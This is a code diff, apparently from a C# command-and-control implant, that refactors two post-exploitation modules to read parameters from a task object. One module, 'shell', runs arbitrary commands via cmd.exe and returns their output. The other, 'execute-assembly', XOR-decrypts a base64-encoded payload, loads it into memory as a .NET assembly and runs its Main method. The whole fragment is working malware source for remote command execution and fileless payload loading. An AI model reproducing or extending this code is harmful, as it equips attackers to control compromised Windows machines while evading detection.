@@ -11,14 +11,14 @@ namespace Execution
     {
         public string Name => "shell";
 
-        public string Execute(string[] args)
+        public string Execute(dynamic task)
         {
             var results = "";
 
             var startInfo = new ProcessStartInfo
             {
                 FileName = @"C:\Windows\System32\cmd.exe",
-                Arguments = $"/c {string.Join(" ", args)}",
+                Arguments = $"/c {string.Join(" ", task.Params)}",
                 WorkingDirectory = Directory.GetCurrentDirectory(),
                 RedirectStandardOutput = true,
                 RedirectStandardError = true,
@@ -46,11 +46,11 @@ namespace Execution
     {
         public string Name => "execute-assembly";
 
-        public string Execute(string[] args)
+        public string Execute(dynamic task)
         {
             try
             {
-                byte[] assemblyBytes = Zor(Convert.FromBase64String(args[0]), args[1]);
+                byte[] assemblyBytes = Zor(Convert.FromBase64String(task.Params[0]), task.Params[1]);
                 Assembly assembly = Assembly.Load(assemblyBytes);
                 foreach (Type type in assembly.GetExportedTypes())
                 {
@@ -63,7 +63,7 @@ namespace Execution
                         Console.SetOut(consoleWriter);
 
                         // Invoke the Main method
-                        mainMethod.Invoke(null, new object[] { SliceArray(args, 2, args.Length - 1) });
+                        mainMethod.Invoke(null, new object[] { SliceArray(task.Params, 2, task.Params.Length - 1) });
 
                         // Restore output
                         Console.SetOut(new StreamWriter(Console.OpenStandardOutput())); // Restore the original output
